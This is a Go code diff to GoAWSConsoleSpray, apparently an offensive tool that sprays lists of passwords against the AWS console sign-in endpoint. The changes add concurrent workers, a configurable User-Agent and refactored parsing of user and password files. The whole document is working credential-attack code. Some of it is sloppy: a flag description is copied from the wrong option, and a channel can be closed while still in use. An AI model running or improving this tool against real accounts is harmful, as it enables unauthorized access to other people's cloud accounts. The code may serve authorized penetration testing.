@@ -4,6 +4,7 @@ package cmd
 import (
 	"bufio"
 	"encoding/json"
+	"fmt"
 	"io"
 	"log"
 	"math/rand/v2"
@@ -12,6 +13,7 @@ import (
 	"os"
 	"regexp"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/projectdiscovery/retryablehttp-go"
@@ -52,8 +54,10 @@ var (
 	fProxy         string
 	fStopOnSuccess bool
 	fSleep         int
+	fworkers       int
 	fDelay         int
 	fJitter        int
+	fUserAgent     string
 
 	signinURL = "https://signin.aws.amazon.com/authenticate"
 	title     = "GoAWSConsoleSpray"
@@ -84,17 +88,101 @@ func Execute() {
 }
 
 func init() {
+	log.SetOutput(os.Stdout)
 	rootCmd.Flags().StringVarP(&fAccountID, "accountID", "a", "", "AWS Account ID (required unless username is ARN)")
 	rootCmd.Flags().StringVarP(&fUserfile, "userfile", "u", "", "Username string or file (required) can be user, arn, or acctId:user format")
 	rootCmd.Flags().StringVarP(&fPassfile, "passfile", "p", "", "Password string or file (required)")
-	rootCmd.Flags().IntVarP(&fSleep, "sleep", "z", 0, "Optional Time to sleep between password requests")
-	rootCmd.Flags().IntVarP(&fDelay, "delay", "d", 0, "Optional Time Delay Between Requests for rate limiting")
+	rootCmd.Flags().IntVarP(&fSleep, "sleep", "z", 0, "Optional Time to sleep between spraying each a password ")
+	rootCmd.Flags().IntVarP(&fDelay, "delay", "d", 0, "Optional Time Delay between login requests")
 	rootCmd.Flags().IntVarP(&fJitter, "jitter", "j", 0, "Optional Time Jitter Between Requests (0 to n)")
 	rootCmd.Flags().StringVarP(&fProxy, "proxy", "x", "", "HTTP or Socks proxy URL & Port. Schema: proto://ip:port")
 	rootCmd.Flags().BoolVarP(&fStopOnSuccess, "stopOnSuccess", "s", false, "Stop password spraying on successful hit")
+	rootCmd.Flags().IntVarP(&fworkers, "workers", "w", 5, "Optional Time to sleep between password requests")
+	rootCmd.Flags().StringVarP(&fUserAgent, "userAgent", "U", "GoAWSConsoleSpray", "Optional User-Agent header")
 
 	rootCmd.MarkFlagRequired("userfile")
 	rootCmd.MarkFlagRequired("passfile")
+}
+
+func readUserDetails(fUserfile string, fAccountID string) ([]userDetails, error) {
+	var usernameList []userDetails
+	var userString string
+
+	userfileHandle, err := os.Open(fUserfile)
+	if err != nil {
+		userString = fUserfile
+	}
+	defer userfileHandle.Close()
+
+	if len(userString) == 0 {
+		scanner := bufio.NewScanner(userfileHandle)
+		for scanner.Scan() {
+			var user userDetails
+			file_entry := scanner.Text()
+			res := regexp.MustCompile(`^\d{12}:`)
+			if strings.Contains(file_entry, "arn:aws:iam::") {
+				user.UserName = strings.Split(file_entry, "/")[2]
+				user.AccountID = strings.Split(file_entry, ":")[4]
+			} else if res.FindString(file_entry) != "" {
+				user.UserName = strings.Split(file_entry, ":")[1]
+				user.AccountID = strings.Split(file_entry, ":")[0]
+			} else {
+				if fAccountID == "" {
+					return nil, fmt.Errorf("AccountID not provided in username or CLI argument")
+				}
+				user.UserName = file_entry
+				user.AccountID = fAccountID
+			}
+			usernameList = append(usernameList, user)
+		}
+		if err := scanner.Err(); err != nil {
+			return nil, fmt.Errorf("Reading Userfile Failure: %s", err.Error())
+		}
+	} else {
+		var user userDetails
+		res := regexp.MustCompile(`^\d{12}:`)
+		if strings.Contains(userString, "arn:aws:iam::") {
+			user.UserName = strings.Split(userString, ":")[4]
+			user.AccountID = strings.Split(userString, "/")[1]
+		} else if res.FindString(userString) != "" {
+			user.UserName = strings.Split(userString, ":")[1]
+			user.AccountID = strings.Split(userString, ":")[0]
+		} else {
+			if fAccountID == "" {
+				return nil, fmt.Errorf("AccountID not provided in username or CLI argument")
+			}
+			user.UserName = userString
+			user.AccountID = fAccountID
+		}
+		usernameList = append(usernameList, user)
+	}
+
+	return usernameList, nil
+}
+
+func readPasswordDetails(fPassfile string) ([]string, error) {
+	var passwordList []string
+	var passString string
+
+	passfileHandle, err := os.Open(fPassfile)
+	if err != nil {
+		passString = fPassfile
+	}
+	defer passfileHandle.Close()
+
+	if len(passString) == 0 {
+		scanner := bufio.NewScanner(passfileHandle)
+		for scanner.Scan() {
+			passwordList = append(passwordList, scanner.Text())
+		}
+		if err := scanner.Err(); err != nil {
+			return nil, fmt.Errorf("Reading Passfile Failure: %s", err.Error())
+		}
+	} else {
+		passwordList = []string{passString}
+	}
+
+	return passwordList, nil
 }
 
 func spray() {
@@ -117,104 +205,64 @@ func spray() {
 		Transport: transport,
 	}, opts)
 
-	var usernameList []userDetails
-	var passwordList []string
-	var userString, passString string
-
-	// Open the files
-	userfileHandle, err := os.Open(fUserfile)
+	usernameList, err := readUserDetails(fUserfile, fAccountID)
 	if err != nil {
-		userString = fUserfile
+		log.Printf("\t[!] ERROR:\t%s", err.Error())
+		return
 	}
-	defer userfileHandle.Close()
-	passfileHandle, err := os.Open(fPassfile)
+
+	passwordList, err := readPasswordDetails(fPassfile)
 	if err != nil {
-		passString = fPassfile
-	}
-	defer passfileHandle.Close()
-
-	// Read username file
-	if len(userString) == 0 {
-		scanner := bufio.NewScanner(userfileHandle)
-		for scanner.Scan() {
-			var user userDetails
-			file_entry := scanner.Text()
-			res := regexp.MustCompile(`^\d{12}:`)
-			if strings.Contains(file_entry, "arn:aws:iam::") {
-				user.UserName = strings.Split(file_entry, "/")[2]
-				user.AccountID = strings.Split(file_entry, ":")[4]
-			} else if res.FindString(file_entry) != "" {
-				user.UserName = strings.Split(file_entry, ":")[1]
-				user.AccountID = strings.Split(file_entry, ":")[0]
-			} else {
-				if fAccountID == "" {
-					log.Printf("\t[!] ERROR:\tAccountID not provided in username or CLI argument.")
-					panic(1)
-				}
-				user.UserName = file_entry
-				user.AccountID = fAccountID
-			}
-			usernameList = append(usernameList, user)
-		}
-		if err := scanner.Err(); err != nil {
-			log.Printf("\t[!] ERROR:\tReading Userfile Failure. \tMessage: %s", err.Error())
-			panic(err)
-		}
-	} else {
-		var user userDetails
-		res := regexp.MustCompile(`^\d{12}:`)
-		if strings.Contains(userString, "arn:aws:iam::") {
-			user.UserName = strings.Split(userString, ":")[4]
-			user.AccountID = strings.Split(userString, "/")[1]
-		} else if res.FindString(userString) != "" {
-			user.UserName = strings.Split(userString, ":")[1]
-			user.AccountID = strings.Split(userString, ":")[0]
-		} else {
-			if fAccountID == "" {
-				log.Printf("\t[!] ERROR:\tAccountID not provided in username or CLI argument.")
-				panic(1)
-			}
-			user.UserName = userString
-			user.AccountID = fAccountID
-		}
-		usernameList = append(usernameList, user)
-	}
-
-	// Read password file
-	if len(passString) == 0 {
-		scanner := bufio.NewScanner(passfileHandle)
-		for scanner.Scan() {
-			passwordList = append(passwordList, scanner.Text())
-		}
-		if err := scanner.Err(); err != nil {
-			log.Printf("\t[!] ERROR:\tReading Passfile Failure. \tMessage: %s", err.Error())
-			panic(err)
-		}
-	} else {
-		passwordList = []string{passString}
+		log.Printf("\t[!] ERROR:\t%s", err.Error())
+		return
 	}
 
 	// Spraying Loop
-	log.Printf("%s: [%d] users loaded. [%d] passwords loaded. [%d] potential login requests.", title, len(usernameList), len(passwordList), (len(usernameList) * len(passwordList)))
-	log.Printf("%s: [%d] Delay [%d] Jitter [%d] Sleep [%s] Proxy [%t] StopOnSuccess", title, fDelay, fJitter, fSleep, fProxy, fStopOnSuccess)
-loop:
-	for i, pass := range passwordList {
+	log.Printf("%s: users loaded: [%d] passwords loaded: [%d] potential login requests [%d]", title, len(usernameList), len(passwordList), (len(usernameList) * len(passwordList)))
+	log.Printf("%s: Delay [%d] Jitter [%d] Sleep [%d] Proxy [%s] StopOnSuccess [%t] Workers [%d]", title, fDelay, fJitter, fSleep, fProxy, fStopOnSuccess, fworkers)
+
+	// Create a channel to distribute work
+	workChan := make(chan struct {
+		user userDetails
+		pass string
+	})
+
+	// Create a WaitGroup to wait for all workers to finish
+	var wg sync.WaitGroup
+
+	// Start worker goroutines
+	for i := 0; i < fworkers; i++ {
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			for work := range workChan {
+				check := attemptLogin(client, work.user.UserName, work.pass, work.user.AccountID, fDelay, fJitter, 1)
+				// connection failures and stop on success
+				if check == CONNFAIL || (fStopOnSuccess && check == SUCCESS) {
+					close(workChan)
+					return
+				}
+				// skip the user if MFA is required, or a valid password was found
+				if check == ACCOUNTMFA || check == SUCCESS {
+					continue
+				}
+			}
+		}()
+	}
+
+	// Distribute work to the workers
+	for _, pass := range passwordList {
 		for _, user := range usernameList {
-			check := attemptLogin(client, user.UserName, pass, user.AccountID, fDelay, fJitter, 1)
-			// connection failures and stop on succes
-			if check == CONNFAIL || (fStopOnSuccess && check == SUCCESS) {
-				break loop
-			}
-			// skip the user if MFA is required, or a valid password was found
-			if check == ACCOUNTMFA || check == SUCCESS {
-				break
-			}
-		}
-		if (fSleep > 0) && (i < (len(passwordList) - 1)) {
-			log.Printf("%s: Sleep Value Configured. [%d/%d] Passwords Completed. Waiting %d seconds\n", title, (i + 1), len(passwordList), fSleep)
-			time.Sleep(time.Duration(fSleep) * time.Second)
+			workChan <- struct {
+				user userDetails
+				pass string
+			}{user, pass}
 		}
 	}
+
+	// Close the work channel and wait for all workers to finish
+	close(workChan)
+	wg.Wait()
 }
 
 func attemptLogin(client *retryablehttp.Client, username string, password string, accountID string, delay int, jitter int, bfSleepRounds int) ReturnStatus {
@@ -244,7 +292,15 @@ func attemptLogin(client *retryablehttp.Client, username string, password string
 	params.Set("rememberAccount", "false")
 
 	// send the request
-	resp, err := client.PostForm(signinURL, params)
+	req, err := retryablehttp.NewRequest("POST", signinURL, strings.NewReader(params.Encode()))
+	if err != nil {
+		log.Printf("[!] ERROR:\tarn:aws:iam::%s:user/%s\tRequest creation failed. \tMessage: %s", accountID, username, err.Error())
+		return CONNFAIL
+	}
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("User-Agent", fUserAgent)
+
+	resp, err := client.Do(req)
 
 	// AWS on successful requests sets the response headers to >4kb, which breaks the HTTP Transport...
 	// If this exception occurs, that means a valid password was observed as a bunch of long cookies are made.
